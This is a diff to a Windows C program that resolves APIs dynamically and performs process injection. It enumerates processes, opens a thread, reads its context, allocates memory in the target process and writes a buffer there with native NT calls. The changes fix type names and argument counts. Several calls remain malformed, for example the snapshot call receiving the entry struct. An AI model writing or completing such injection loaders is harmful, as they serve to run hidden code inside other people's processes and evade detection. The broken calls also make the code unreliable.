@@ -4,6 +4,7 @@
 #include <winnt.h>
 #include <intrin.h>
 #include <shlwapi.h>
+#include "main.h"
 
 
 #pragma comment(lib, "shlwapi.lib")
@@ -146,6 +147,8 @@ int main(int argc, char** argv, char* envp) {
 	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, L"CreateToolhelp32Snapshot");
 	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, L"Process32First");
 	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, L"Process32Next");
+	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, L"CloseHandle");
+
 
 
 	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,L"NtOpenThread");
@@ -161,11 +164,11 @@ int main(int argc, char** argv, char* envp) {
 	HANDLE hThread;
 	HANDLE hProc;
 	OBJECT_ATTRIBUTES oa;
-
+	DWORD pid;
 	PVOID baseAddress = NULL;
 	ULONG n;
 	PCONTEXT CTX;
-	PROCESS32ENTRY dw;
+	PROCESSENTRY32 dw;
 	dw.dwSize = sizeof(dw);
 
 	HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(dw, dw.dwSize);
@@ -189,7 +192,7 @@ int main(int argc, char** argv, char* envp) {
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
 
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, n,n,n);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, n,n,n,n);
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, &baseAddress, &buf, sizeof(buf), &n);
 
